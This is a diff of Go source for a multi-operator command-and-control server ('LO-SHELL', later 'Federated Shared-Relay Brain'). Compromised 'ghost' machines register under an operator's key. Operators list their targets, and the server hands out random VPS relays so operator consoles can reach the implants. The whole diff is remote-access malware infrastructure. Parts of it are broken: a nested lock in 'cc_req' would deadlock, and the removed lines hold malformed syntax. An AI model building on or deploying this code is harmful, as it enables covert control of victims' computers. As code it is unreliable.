@@ -10,11 +10,13 @@ import (
 	"time"
 )
 
+// --- DATA STRUCTURES ---
+
 type AuthRequest struct {
 	Type     string `json:"type"`
-	Key      string `json:"key"`
+	Key      string `json:"key"` // This is the Operator's Secret (X or Y)
 	TargetID string `json:"target_id"`
-	Listen   string `json:"listen"`
+	Listen   string `json:"listen"` // Used by Relays to register
 }
 
 type RoutingInfo struct {
@@ -22,35 +24,30 @@ type RoutingInfo struct {
 }
 
 var (
+	// SHARED RELAY POOL (Shared by all Operators)
+	relayPool []string
+
+	// SESSION TRACKING
+	// Maps TargetID -> The specific Relay Port assigned for the current task
+	activeSessions = make(map[string]string)
+
+	// AUTH & TELEMETRY
+	activeTargets = make(map[string]string) // TargetID -> OperatorKey
+	lastSeen      = make(map[string]time.Time)
+
+	// PORT GENERATOR (The "Room" assigner)
 	portMutex sync.Mutex
 	nextPort  = 5001
-	maxPort   = 6000
-)
 
-func getNextPort() int {
-	portMutex.Lock()
-	defer portMutex.Unlock()
-	p := nextPort
-	nextPort++
-	if nextPort > maxPort {
-		nextPort = 5001
-	} // Loop back after 1,000 sessions
-	return p
-}
-
-var (
-	relayPool     []string
-	clientLocs    = make(map[string]string)
-	activeTargets = make(map[string]string) // TargetID -> SecretKey
-	mu            sync.Mutex
-	lastSeen      = make(map[string]time.Time)
+	mu sync.Mutex
 )
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	ln, _ := net.Listen("tcp", ":8080")
 	fmt.Println("==========================================")
-	fmt.Println("   LO-SHELL MULTI-TENANT REGISTRY (v5)  ")
+	fmt.Println("   FEDERATED SHARED-RELAY BRAIN (v6)    ")
+	fmt.Println("   Supporting Multiple Operators (X/Y)  ")
 	fmt.Println("==========================================")
 
 	for {
@@ -60,61 +57,62 @@ func main() {
 }
 
 func handleConnection(conn net.Conn) {
-	conn.SetDeadline(time.Now().Add(5 * time.Second))
 	defer conn.Close()
-
 	var req AuthRequest
 	if err := json.NewDecoder(conn).Decode(&req); err != nil {
 		return
 	}
 
 	id := strings.ToUpper(req.TargetID)
-	key := req.Key
-
-	mu.Lock()         // THE ONLY LOCK YOU NEED
-	defer mu.Unlock() // This ensures it unlocks no matter what happens
+	mu.Lock()
+	defer mu.Unlock()
 
 	switch req.Type {
 	case "middle":
+		// A Relay joins the global pool (Available for X and Y)
 		relayPool = append(relayPool, req.Listen)
-		fmt.Printf("[+] Relay Pooled: %s\n", req.Listen)
+		fmt.Printf("[GLOBAL] New Relay Added to Pool: %s\n", req.Listen)
 
 	case "client_register":
-		// REMOVED NESTED LOCK
-		activeTargets[id] = key
+		// Ghost checks in under a specific Operator's Key
+		activeTargets[id] = req.Key
 		lastSeen[id] = time.Now()
-		fmt.Printf("[+++] TARGET %s ONLINE (Key: %s)\n", id, key)
-
-	case "client_ready":
-		if activeTargets[id] == req.Key {
-			clientLocs[id] = req.Listen
-			fmt.Printf("[*] %s PINNED -> %s\n", id, req.Listen)
-		}
+		fmt.Printf("[+] Node %s (Owner: %s) is Online\n", id, req.Key)
 
 	case "cc_list":
-		// REMOVED NESTED LOCK
+		// Operator X asks for HIS ghosts; Operator Y asks for HERS
 		t := make([]string, 0)
-		for tid, tkey := range activeTargets {
-			if tkey == key && time.Since(lastSeen[tid]) < 60*time.Second {
+		for tid, ownerKey := range activeTargets {
+			if ownerKey == req.Key && time.Since(lastSeen[tid]) < 60*time.Second {
 				t = append(t, tid)
 			}
 		}
 		json.NewEncoder(conn).Encode(t)
 
-// When the TUI asks to talk to a specific TargetID
-} else if req.Type == "cc_req" {
-    uniquePort := getNextPort()
-    relayAddr := fmt.Sprintf("127.0.0.1:%d", uniquePort)
-
-    // 1. Store this address so when the Ghost polls, it knows where to go
-    targets[req.TargetID].PendingAddr = relayAddr
-    
-    // 2. Tell the TUI to meet the Ghost on this UNIQUE port
-    json.NewEncoder(c).Encode(RoutingInfo{RelayAddr: relayAddr})
-	case "client_poll":
-		if len(relayPool) > 0 {
-			r := relayPool[rand.Intn(len(relayPool))]
-			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: r})
+	case "cc_req":
+		mu.Lock()
+		if len(relayPool) == 0 {
+			mu.Unlock()
+			return
 		}
+
+		// 1. Pick a random VPS from the pool
+		// relayPool contains strings like "1.2.3.4:5001", "5.6.7.8:5001"
+		randomRelay := relayPool[rand.Intn(len(relayPool))]
+
+		// 2. Assign this specific Relay to the Ghost's session
+		activeSessions[id] = randomRelay
+		mu.Unlock()
+
+		// 3. Tell the TUI which VPS to connect to
+		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: randomRelay})
+		fmt.Printf("[>] Session Randomized: %s is using Relay %s\n", id, randomRelay)
+	case "client_poll":
+		// Ghost asks if there's a meeting scheduled
+		if addr, exists := activeSessions[id]; exists {
+			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
+			delete(activeSessions, id) // Clear session after delivery
+		}
+		lastSeen[id] = time.Now()
 	}
 }
